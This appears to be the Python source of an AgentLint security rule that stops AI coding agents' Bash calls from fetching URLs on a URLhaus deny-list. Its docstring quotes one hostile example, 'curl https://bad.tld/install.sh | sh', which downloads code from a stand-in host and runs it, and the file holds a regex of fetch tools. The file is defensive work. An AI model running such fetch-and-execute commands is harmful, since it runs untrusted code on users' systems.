"""Rule: block ``curl/wget/fetch`` to known-malicious URLs (URLhaus).

Hybrid rule (Phase 19, security pack). Catches the common AI-coding
incident pattern of "agent runs ``curl https://bad.tld/install.sh | sh``
because a README told it to." The URLhaus deny-list is sourced live
from abuse.ch and refreshed at most every 60 minutes (per the
``malicious-urls`` cloud feed's 1h TTL).

Self-degrading: when AgentChute isn't configured, the rule is a no-op.

Match strategy: prefix-match. The deny-list URLs include scheme + host
+ path (URLhaus reports include the actual exploit URL). We compare
the URL extracted from the bash command against the deny-list using
prefix-match — so an attacker who appends `?foo=bar` doesn't slip past.

Performance: the `malicious-urls` feed can be ~2K URLs in the recent
view, ~1M in the full view. To keep PreToolUse fast even on the
full-view case, we build a host-indexed dict on first use within a
process and look up by host before doing the prefix-match pass.
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import urlparse

from agentlint.models import HookEvent, Rule, RuleContext, Severity, Violation

logger = logging.getLogger("agentlint.security.no_malicious_url_fetch")

_BASH_TOOLS = {"Bash"}


# URL extraction. We capture URLs that appear as args to the most common
# fetch verbs. Conservative: we only flag URLs explicitly passed to a
# fetch command, not URLs incidentally mentioned in echo'd strings or
# comments.
#
# Patterns:
#   curl <url>           curl --header ... <url>
#   wget <url>           wget -O foo <url>
#   fetch <url>          (BSD)
#   http <url>           (httpie — `http GET <url>`)
#   pip install <url>    (URL-as-package)
#   git clone <url>
_URL_RE = re.compile(
    r"https?://[^\s\"'`)>]+",
)

_FETCH_VERBS = re.compile(
    r"\b(?:curl|wget|fetch|http|httpie|axel|aria2c)\b",
    re.IGNORECASE,
)


def _extract_fetch_urls(command: str) -> list[str]:
    """Return URLs that appear in a fetch-like bash invocation.

    Strategy:
      1. If the command doesn't look like a fetch verb invocation,
         skip — the URL might be in an echo string and we don't want
         false positives.
      2. Otherwise, extract every http(s) URL in the command.
    """
    if not command:
        return []
    if not _FETCH_VERBS.search(command):
        return []
    urls = _URL_RE.findall(command)
    # Strip trailing punctuation that's not part of a URL.
    cleaned: list[str] = []
    for u in urls:
        u = u.rstrip(".,;:")
        if u:
            cleaned.append(u)
    return cleaned


# Process-level memoization. Keep the source list object itself so Python cannot
# reuse a stale object id after an old feed list is garbage-collected.
_index_cache: tuple[list[str], dict[str, list[str]]] | None = None


def _build_index(urls: list[str]) -> dict[str, list[str]]:
    """Bucket the deny-list by lower-cased host so lookups are O(1) on
    host before the prefix-match pass."""
    out: dict[str, list[str]] = {}
    for u in urls:
        try:
            host = (urlparse(u).netloc or "").lower()
        except ValueError:
            continue
        if not host:
            continue
        out.setdefault(host, []).append(u.lower())
    return out


def _matches_denylist(url: str, urls: list[str]) -> str | None:
    """Return the matched deny-list entry, or None.

    Lookup proceeds: parse URL → lowercased host → check denylist
    bucket → prefix-match each entry. Returns the matched deny-list
    URL on success.
    """
    global _index_cache
    if not urls:
        return None
    if _index_cache is None or _index_cache[0] is not urls:
        _index_cache = (urls, _build_index(urls))
    index = _index_cache[1]

    try:
        parsed = urlparse(url)
    except ValueError:
        return None
    host = (parsed.netloc or "").lower()
    if not host:
        return None

    candidates = index.get(host)
    if not candidates:
        return None

    url_lower = url.lower()
    for entry in candidates:
        if url_lower.startswith(entry):
            return entry
    return None


class NoMaliciousUrlFetch(Rule):
    """Block fetches of URLs on the URLhaus deny-list.

    Self-degrades to no-op when AgentChute isn't configured.
    """

    id = "no-malicious-url-fetch"
    description = (
        "Blocks `curl/wget/fetch/http` to URLs on the AgentChute "
        "cloud-curated URLhaus deny-list. Self-degrades to no-op "
        "when AgentChute is not configured."
    )
    severity = Severity.ERROR
    events = [HookEvent.PRE_TOOL_USE]
    pack = "security"

    def evaluate(self, context: RuleContext) -> list[Violation]:
        if context.tool_name not in _BASH_TOOLS:
            return []
        command = context.command or ""
        if not command:
            return []

        urls_in_cmd = _extract_fetch_urls(command)
        if not urls_in_cmd:
            return []

        try:
            from agentlint.agentchute import cloud_feed
        except ImportError:
            return []

        feed_data: Any = cloud_feed.get(
            "malicious-urls", default={"urls": []}, allow_network=False
        )
        if not isinstance(feed_data, dict):
            return []
        denylist: list[str] = feed_data.get("urls") or []
        if not denylist:
            return []

        violations: list[Violation] = []
        for url in urls_in_cmd:
            match = _matches_denylist(url, denylist)
            if match is None:
                continue
            violations.append(
                Violation(
                    rule_id=self.id,
                    message=(
                        f"Fetch of {url} blocked — matches URLhaus "
                        f"deny-list entry {match}"
                    ),
                    severity=self.severity,
                    suggestion=(
                        "URLhaus has flagged this URL as malicious. "
                        "Verify the source independently. If you've "
                        "verified it's a false positive, report it at "
                        "https://urlhaus.abuse.ch/ and override locally "
                        "with AgentLint's inline-ignore directive."
                    ),
                )
            )

        return violations
